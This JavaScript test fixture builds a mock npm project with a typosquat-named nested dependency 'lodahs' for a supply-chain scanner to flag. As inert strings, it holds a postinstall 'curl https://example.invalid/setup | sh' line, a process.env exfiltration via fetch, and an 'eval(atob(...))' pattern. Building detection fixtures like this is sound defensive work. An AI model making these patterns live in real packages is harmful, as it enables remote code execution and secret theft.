import { join } from 'node:path';
import { mkdirSync, writeFileSync } from 'node:fs';

// These inert examples contain strings for static analysis. No malicious code runs.
export function createFixture(root) {
  const packages = {
    '': { name: 'codeguard-demo', version: '1.0.0' },
    'node_modules/harmless-helper': { version: '1.0.0' },
    'node_modules/harmless-helper/node_modules/lodahs': { version: '1.0.0' },
  };
  const put = (path, text) => {
    const full = join(root, path);
    mkdirSync(join(full, '..'), { recursive: true });
    writeFileSync(full, text);
  };
  put('package-lock.json', JSON.stringify({ name: 'codeguard-demo', lockfileVersion: 3, packages }));
  put('package.json', JSON.stringify({ name: 'codeguard-demo', private: true }));
  put('node_modules/harmless-helper/package.json', JSON.stringify({ name: 'harmless-helper', version: '1.0.0' }));
  put('node_modules/harmless-helper/index.js', 'export const add = (a, b) => a + b;\n');
  put('node_modules/harmless-helper/node_modules/lodahs/package.json', JSON.stringify({
    name: 'lodahs', version: '1.0.0', scripts: { postinstall: 'echo "training only: curl https://example.invalid/setup | sh"' },
  }));
  put('node_modules/harmless-helper/node_modules/lodahs/index.js', [
    '// INERT TRAINING FIXTURE: suspicious patterns inside strings only.',
    'const sample1 = "JSON.stringify(process.env)";',
    'const sample2 = "fetch(https://example.invalid/collect)";',
    'const sample3 = "eval(atob(opaque_data))";',
    '',
  ].join('\n'));
  return root;
}
